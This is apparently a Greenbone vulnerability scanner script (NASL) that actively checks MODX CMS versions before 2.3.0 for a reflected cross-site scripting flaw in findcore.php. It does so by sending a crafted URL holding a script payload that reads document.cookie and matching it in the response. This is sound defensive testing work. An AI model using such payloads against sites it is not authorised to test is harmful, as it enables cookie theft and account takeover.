# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804124");
  script_version("2025-03-19T05:38:35+0000");
  script_tag(name:"last_modification", value:"2025-03-19 05:38:35 +0000 (Wed, 19 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-10-29 11:49:17 +0530 (Tue, 29 Oct 2013)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("MODX CMS < 2.3.0 XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_modx_cms_http_detect.nasl");
  script_mandatory_keys("modx/cms/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"MODX CMS is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists due to improper sanitization of url, when
  accessing 'findcore.php' and 'xpdo.class.php' scripts.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML or script code, steal cookie-based authentication credentials and launch other
  attacks.");

  script_tag(name:"affected", value:"MODX version 2.2.10 and probably prior.");

  script_tag(name:"solution", value:"Update to version 2.3.0 or later.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/88208");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63274");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Oct/108");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/modx-2210-cross-site-scripting");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

cpe_list = make_list( "cpe:/a:modx:unknown",
                      "cpe:/a:modx:revolution",
                      "cpe:/a:modx:evolution" );

if( ! infos = get_app_port_from_list( cpe_list:cpe_list, service:"www" ) )
  exit( 0 );

cpe = infos["cpe"];
port = infos["port"];

if( ! dir = get_app_location( cpe:cpe, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

req = http_get( port:port, item:dir + "/setup/templates/findcore.php" );
res = http_keepalive_send_recv( port:port, data:req );

if( res &&  ">MODX Revolution<" >< res ) {

  url = dir + "/setup/templates/findcore.php/%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E" ;

  if( http_vuln_check( port:port, url:url, check_header:TRUE,
                       pattern:"<script>alert\(document\.cookie\);</script>" ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
